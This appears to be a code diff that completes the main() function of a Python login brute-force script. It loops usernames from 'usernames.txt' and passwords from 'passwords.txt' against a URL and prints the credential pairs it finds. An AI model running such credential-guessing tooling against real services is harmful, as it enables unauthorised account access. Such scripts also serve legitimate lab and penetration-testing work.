@@ -68,7 +68,22 @@ def enumerate_pass(url, user, password_file_list, headers, cookies):
                 return password
 
 def main():
-    pass
-
+    users = enumerate_user(
+        url, 
+        'usernames.txt',
+        headers=headers,
+        cookies=cookies
+    )
+    print(users)
+    for user in users:
+        password = enumerate_pass(
+            url=url,
+            user=user,
+            password_file_list='passwords.txt',
+            headers=headers,
+            cookies=cookies
+        )
+        print(user.strip(), ':', password.strip())
+        
 if __name__ == '__main__':
     main()
